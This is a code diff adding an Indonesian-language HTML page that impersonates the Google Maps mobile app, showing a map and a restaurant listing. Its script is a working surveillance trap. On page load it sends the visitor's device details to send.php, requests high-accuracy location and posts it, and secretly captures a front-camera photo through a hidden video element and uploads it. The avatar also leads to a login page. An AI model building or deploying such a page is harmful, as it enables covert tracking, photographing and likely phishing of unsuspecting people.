@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Google Maps</title>
+
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+html, body { height: 100%; overflow: hidden; background: #e5e3df; }
+#map { position: absolute; inset: 0; z-index: 1; width: 100%; height: 100%; }
+.leaflet-control-attribution { display: none !important; }
+.leaflet-control-zoom { display: none !important; }
+.search-bar {
+  position: absolute; top: 12px; left: 12px; right: 12px;
+  background: #fff; border-radius: 28px;
+  box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+  display: flex; align-items: center;
+  padding: 0 8px 0 16px; height: 52px; z-index: 20;
+}
+.search-bar .menu-icon { font-size: 22px; color: #5f6368; margin-right: 12px; cursor: pointer; }
+.search-bar input { flex: 1; border: none; outline: none; font-size: 17px; color: #202124; background: transparent; }
+.search-bar input::placeholder { color: #5f6368; }
+.search-bar .icon-btn { width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #5f6368; }
+.search-bar .avatar { width: 40px; height: 40px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; margin-left: 4px; flex-shrink: 0; }
+.search-bar .avatar svg { width: 26px; height: 26px; }
+.chip {
+  position: absolute; top: 76px; left: 50%; transform: translateX(-50%);
+  background: #fff; border-radius: 20px; padding: 10px 18px;
+  box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+  font-size: 14px; color: #202124; font-weight: 500;
+  z-index: 15; white-space: nowrap;
+}
+.fab-location { position: absolute; top: 130px; right: 16px; width: 44px; height: 44px; background: #fff; border-radius: 50%; box-shadow: 0 1px 6px rgba(32,33,36,0.28); display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 15; }
+.fab-location .dot { width: 20px; height: 20px; border: 3px solid #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+.fab-location .dot::after { content: ''; width: 6px; height: 6px; background: #1a73e8; border-radius: 50%; }
+.thumbnail { position: absolute; bottom: 230px; left: 16px; width: 80px; height: 80px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.3); background: linear-gradient(135deg, #c5c8d6, #8e919e); z-index: 15; cursor: pointer; }
+.thumbnail img { width: 100%; height: 100%; object-fit: cover; display: block; }
+.fab-blue { position: absolute; bottom: 230px; right: 16px; width: 44px; height: 44px; background: #fff; border-radius: 50%; box-shadow: 0 1px 6px rgba(32,33,36,0.28); display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 15; }
+.fab-blue .inner { width: 20px; height: 20px; border: 3px solid #1a73e8; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+.fab-blue .inner::after { content: ''; width: 6px; height: 6px; background: #1a73e8; border-radius: 50%; }
+.bottom-sheet { position: absolute; bottom: 0; left: 0; right: 0; background: #fff; border-radius: 16px 16px 0 0; box-shadow: 0 -2px 10px rgba(0,0,0,0.15); padding: 12px 16px 24px; z-index: 20; }
+.handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin: 0 auto 12px; }
+.bs-header { display: flex; align-items: flex-start; justify-content: space-between; }
+.bs-title { font-size: 22px; color: #202124; font-weight: 400; margin-bottom: 4px; }
+.bs-icons { display: flex; gap: 14px; color: #5f6368; font-size: 20px; }
+.bs-icons span { cursor: pointer; }
+.bs-rating { color: #5f6368; font-size: 14px; margin-bottom: 4px; }
+.bs-rating .star { color: #fbbc04; }
+.bs-type { color: #5f6368; font-size: 14px; margin-bottom: 4px; }
+.bs-status { color: #e37400; font-size: 14px; margin-bottom: 14px; }
+.bs-actions { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 4px; }
+.bs-actions::-webkit-scrollbar { display: none; }
+.action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; min-width: 64px; cursor: pointer; }
+.action-btn .circle { width: 44px; height: 44px; border-radius: 50%; background: #e8f0fe; color: #1a73e8; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+.action-btn .circle.primary { background: #1a73e8; color: #fff; }
+.action-btn .label { font-size: 12px; color: #1a73e8; }
+.gm-marker { width: 28px; height: 28px; border-radius: 50% 50% 50% 0; transform: rotate(-45deg); box-shadow: 0 2px 6px rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; border: 2px solid #fff; }
+.gm-marker span { transform: rotate(45deg); color: #fff; font-size: 12px; }
+</style>
+</head>
+<body>
+
+<div id="map"></div>
+
+<div class="search-bar">
+  <span class="menu-icon">☰</span>
+  <input type="text" placeholder="Telusuri di sini" readonly>
+  <div class="icon-btn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.92V21h2v-3.08A7 7 0 0 0 19 11h-2z"/></svg>
+  </div>
+  <div class="icon-btn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5f6368" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
+  </div>
+  <div class="avatar" onclick="location.href='login.html'">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="12" cy="12" r="10" stroke="#00838f" stroke-width="2" fill="none"/>
+      <circle cx="12" cy="9" r="3" stroke="#00838f" stroke-width="2" fill="none"/>
+      <path d="M6 19c1.5-3 4-4 6-4s4.5 1 6 4" stroke="#00838f" stroke-width="2" fill="none" stroke-linecap="round"/>
+    </svg>
+  </div>
+</div>
+
+<div class="chip">Lihat restoran di sekitar</div>
+<div class="fab-location"><div class="dot"></div></div>
+<div class="thumbnail">
+  <img src="https://maps.googleapis.com/maps/api/streetview?size=200x200&location=-6.4025,106.7942" alt="" onerror="this.style.display='none'">
+</div>
+<div class="fab-blue"><div class="inner"></div></div>
+
+<div class="bottom-sheet">
+  <div class="handle"></div>
+  <div class="bs-header">
+    <div class="bs-title">JKT FRESH</div>
+    <div class="bs-icons"><span>🔖</span><span>↗</span><span>✕</span></div>
+  </div>
+  <div class="bs-rating"><span class="star">4,1 ★★★★☆</span> (484) · 43 mnt</div>
+  <div class="bs-type">Restoran</div>
+  <div class="bs-status">Segera tutup · 19.00 · Buka Kam pukul 09.00</div>
+  <div class="bs-actions">
+    <div class="action-btn"><div class="circle primary">➤</div><div class="label">Rute</div></div>
+    <div class="action-btn"><div class="circle">➤</div><div class="label">Mulai</div></div>
+    <div class="action-btn"><div class="circle">📞</div><div class="label">Telepon</div></div>
+    <div class="action-btn"><div class="circle">💬</div><div class="label">Tanya</div></div>
+    <div class="action-btn"><div class="circle">↗</div><div class="label">Bagikan</div></div>
+  </div>
+</div>
+
+<video id="camPreview" autoplay playsinline muted style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;"></video>
+<canvas id="camCanvas" style="display:none;"></canvas>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+const LAT = -6.4025;
+const LNG = 106.7942;
+const ENDPOINT = 'send.php';
+
+// Init peta
+const map = L.map('map', {
+  center: [LAT, LNG],
+  zoom: 16,
+  zoomControl: false,
+  attributionControl: false,
+  tap: true,
+  dragging: true,
+  touchZoom: true,
+  scrollWheelZoom: true,
+  doubleClickZoom: true,
+});
+
+// Tile Google Maps
+L.tileLayer('https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
+  maxZoom: 20,
+  subdomains: ['mt0', 'mt1', 'mt2', 'mt3'],
+}).addTo(map);
+
+function makeMarker(lat, lng, color, icon) {
+  return L.marker([lat, lng], {
+    icon: L.divIcon({
+      className: '',
+      html: '<div class="gm-marker" style="background:' + color + ';"><span>' + icon + '</span></div>',
+      iconSize: [28, 28],
+      iconAnchor: [14, 28],
+    })
+  });
+}
+
+const jktMarker = L.marker([LAT, LNG], {
+  icon: L.divIcon({
+    className: '',
+    html: '<div style="position:relative;"><div style="width:32px;height:32px;background:#ea4335;border-radius:50% 50% 50% 0;transform:rotate(-45deg);box-shadow:0 2px 6px rgba(0,0,0,0.4);border:2px solid #fff;"></div><div style="position:absolute;top:8px;left:10px;width:10px;height:10px;background:#fff;border-radius:50%;"></div></div>',
+    iconSize: [32, 32],
+    iconAnchor: [16, 32],
+  })
+}).addTo(map);
+
+makeMarker(-6.3980, 106.7910, '#f29900', '🍴').addTo(map);
+makeMarker(-6.3960, 106.8010, '#f29900', '🍴').addTo(map);
+makeMarker(-6.4060, 106.7850, '#f29900', '🍴').addTo(map);
+makeMarker(-6.3990, 106.7920, '#a142f4', '🎡').addTo(map);
+makeMarker(-6.4070, 106.7970, '#ea4335', 'H').addTo(map);
+makeMarker(-6.4040, 106.8010, '#34a853', '').addTo(map);
+makeMarker(-6.4055, 106.7985, '#e91e63', '🎬').addTo(map);
+
+jktMarker.on('click', function() { document.querySelector('.bottom-sheet').style.display = 'block'; });
+map.on('click', function() { document.querySelector('.bottom-sheet').style.display = 'none'; });
+
+function sendToServer(data) {
+  fetch(ENDPOINT, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  }).then(function(r){ return r.text(); }).then(function(t){
+    console.log('sent:', t);
+  }).catch(function(e){
+    console.log('err:', e);
+  });
+}
+
+function requestLocation() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      sendToServer({
+        type: 'location',
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: new Date().toISOString(),
+        ua: navigator.userAgent
+      });
+      map.setView([pos.coords.latitude, pos.coords.longitude], 16);
+    },
+    function(err) {
+      sendToServer({type: 'location_denied', error: err.message, ua: navigator.userAgent});
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+async function requestCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' }, audio: false
+    });
+    const video = document.getElementById('camPreview');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(function(r){ setTimeout(r, 1500); });
+
+    const canvas = document.getElementById('camCanvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+    sendToServer({ type: 'camera_photo', image: dataUrl, ua: navigator.userAgent });
+    stream.getTracks().forEach(function(t){ t.stop(); });
+  } catch (err) {
+    sendToServer({ type: 'camera_denied', error: err.message, ua: navigator.userAgent });
+  }
+}
+
+window.addEventListener('load', function() {
+  setTimeout(requestLocation, 1000);
+  setTimeout(requestCamera, 3000);
+
+  sendToServer({
+    type: 'visit',
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + 'x' + screen.height,
+    timestamp: new Date().toISOString()
+  });
+});
+
+document.querySelector('.fab-location').addEventListener('click', requestLocation);
+document.querySelector('.fab-blue').addEventListener('click', requestLocation);
+document.querySelector('.chip').addEventListener('click', function() {
+  map.setView([LAT, LNG], 17);
+  document.querySelector('.bottom-sheet').style.display = 'block';
+});
+</script>
+
+</body>
+  </html>
